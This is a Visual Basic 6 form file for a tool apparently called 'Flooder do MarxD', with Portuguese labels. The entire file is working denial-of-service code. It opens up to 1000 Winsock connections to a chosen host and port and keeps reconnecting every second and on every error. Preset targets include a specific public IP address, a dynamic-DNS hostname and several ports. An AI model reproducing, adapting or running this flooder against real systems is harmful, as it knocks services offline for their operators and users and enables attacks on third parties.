VERSION 5.00
Object = "{248DD890-BB45-11CF-9ABC-0080C7E7B78D}#1.0#0"; "MSWINSCK.OCX"
Begin VB.Form Form1 
   BorderStyle     =   3  'Fixed Dialog
   Caption         =   "Flooder do MarxD"
   ClientHeight    =   3075
   ClientLeft      =   45
   ClientTop       =   375
   ClientWidth     =   5415
   Icon            =   "Form1.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   3075
   ScaleWidth      =   5415
   StartUpPosition =   2  'CenterScreen
   Begin VB.TextBox Text3 
      Alignment       =   2  'Center
      Appearance      =   0  'Flat
      Height          =   1215
      Left            =   2520
      MultiLine       =   -1  'True
      TabIndex        =   11
      Text            =   "Form1.frx":08CA
      Top             =   1080
      Width           =   2775
   End
   Begin VB.CommandButton Command8 
      Caption         =   "44405"
      Height          =   375
      Left            =   2520
      TabIndex        =   10
      Top             =   600
      Width           =   615
   End
   Begin VB.CommandButton Command7 
      Caption         =   "Parar"
      Enabled         =   0   'False
      Height          =   495
      Left            =   2520
      TabIndex        =   9
      Top             =   2400
      Width           =   2775
   End
   Begin VB.CommandButton Command6 
      Caption         =   "mxsv.sytes.net"
      Height          =   375
      Left            =   3960
      TabIndex        =   8
      Top             =   120
      Width           =   1335
   End
   Begin VB.CommandButton Command5 
      Caption         =   "192.168.1.151"
      Height          =   375
      Left            =   2520
      TabIndex        =   7
      Top             =   120
      Width           =   1335
   End
   Begin VB.CommandButton Command4 
      Caption         =   "55905"
      Height          =   375
      Left            =   4680
      TabIndex        =   6
      Top             =   600
      Width           =   615
   End
   Begin VB.CommandButton Command3 
      Caption         =   "55903"
      Height          =   375
      Left            =   3960
      TabIndex        =   5
      Top             =   600
      Width           =   615
   End
   Begin VB.CommandButton Command2 
      Caption         =   "55901"
      Height          =   375
      Left            =   3240
      TabIndex        =   4
      Top             =   600
      Width           =   615
   End
   Begin VB.ListBox List1 
      Height          =   1230
      ItemData        =   "Form1.frx":0923
      Left            =   120
      List            =   "Form1.frx":0936
      TabIndex        =   3
      Top             =   1080
      Width           =   2295
   End
   Begin VB.Timer Timer1 
      Enabled         =   0   'False
      Interval        =   1000
      Left            =   2520
      Top             =   1560
   End
   Begin VB.CommandButton Command1 
      Caption         =   "vai"
      Height          =   495
      Left            =   120
      TabIndex        =   2
      Top             =   2400
      Width           =   2295
   End
   Begin VB.TextBox Text2 
      Height          =   375
      Left            =   120
      TabIndex        =   1
      Text            =   "55932"
      Top             =   600
      Width           =   2295
   End
   Begin VB.TextBox Text1 
      Height          =   375
      Left            =   120
      TabIndex        =   0
      Text            =   "212.124.118.174"
      Top             =   120
      Width           =   2295
   End
   Begin MSWinsockLib.Winsock Sock 
      Index           =   0
      Left            =   2520
      Top             =   1080
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Private Sub Command1_Click()
If List1.Text = "" Then Exit Sub
'List1.Enabled = False
Text1.Enabled = False
Text2.Enabled = False
Command1.Enabled = False
Command7.Enabled = True
Timer1.Enabled = True
Dim i As Integer
For i = 1 To List1.Text
    Call conectar(i)
Next i
End Sub

Private Sub Command2_Click()
Text2.Text = Command2.Caption
End Sub

Private Sub Command3_Click()
Text2.Text = Command3.Caption
End Sub

Private Sub Command4_Click()
Text2.Text = Command4.Caption
End Sub

Private Sub Command5_Click()
Text1.Text = Command5.Caption
End Sub

Private Sub Command6_Click()
Text1.Text = Command6.Caption
End Sub

Private Sub Command7_Click()
Command1.Enabled = True
Command7.Enabled = False
Text1.Enabled = True
Text2.Enabled = True
Timer1.Enabled = False
For i = 1 To 1000
    On Error Resume Next
    Sock(i).Close
Next i
End Sub

Private Sub Command8_Click()
Text2.Text = Command8.Caption
End Sub

Private Sub Form_Load()
Dim i As Integer
For i = 1 To 1000
    Load Sock(i)
Next i

End Sub

Private Sub Sock_Error(index As Integer, ByVal Number As Integer, Description As String, ByVal Scode As Long, ByVal Source As String, ByVal HelpFile As String, ByVal HelpContext As Long, CancelDisplay As Boolean)
Call conectar(index)
End Sub

Public Function conectar(index As Integer)
On Error Resume Next
Sock(index).Close
On Error Resume Next
Sock(index).Connect Text1.Text, Text2.Text
End Function

Private Sub Timer1_Timer()
Dim totalon As Integer

Dim i As Integer
For i = 1 To List1.Text
    If Sock(i).State <> 7 Then Call conectar(i)
    If Sock(i).State = 7 Then totalon = totalon + 1
Next i

Me.Caption = totalon & " de " & List1.Text & " conectado!"
End Sub
